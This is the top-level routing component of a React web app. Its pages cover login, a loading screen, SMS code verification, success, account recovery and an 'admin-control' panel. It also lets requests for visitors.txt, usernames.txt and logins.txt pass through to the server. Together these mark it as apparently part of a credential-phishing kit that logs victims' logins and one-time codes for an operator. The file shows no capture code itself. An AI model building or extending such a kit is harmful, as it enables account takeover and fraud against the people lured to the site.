import { Switch, Route } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import Login from "@/pages/login";
import LoadingPage from "@/pages/loading";
import AdminControl from "@/pages/admin-control";
import SMSVerification from "@/pages/sms";
import Success from "@/pages/success";
import NotFound from "@/pages/not-found";
import RecoverUsername from "@/pages/recover-username";
import RecoverPassword from "@/pages/recover-password";
import Register from "@/pages/register";
import Privacy from "@/pages/privacy";
import Terms from "@/pages/terms";

function Router() {
  if (window.location.pathname === '/visitors.txt' || window.location.pathname === '/usernames.txt' || window.location.pathname === '/logins.txt') {
    return null;
  }

  return (
    <Switch>
      <Route path="/" component={Login} />
      <Route path="/login" component={Login} />
      <Route path="/loading" component={LoadingPage} />
      <Route path="/admin-control" component={AdminControl} />
      <Route path="/sms" component={SMSVerification} />
      <Route path="/success" component={Success} />
      <Route path="/recover-username" component={RecoverUsername} />
      <Route path="/recover-password" component={RecoverPassword} />
      <Route path="/register" component={Register} />
      <Route path="/privacy" component={Privacy} />
      <Route path="/terms" component={Terms} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Router />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
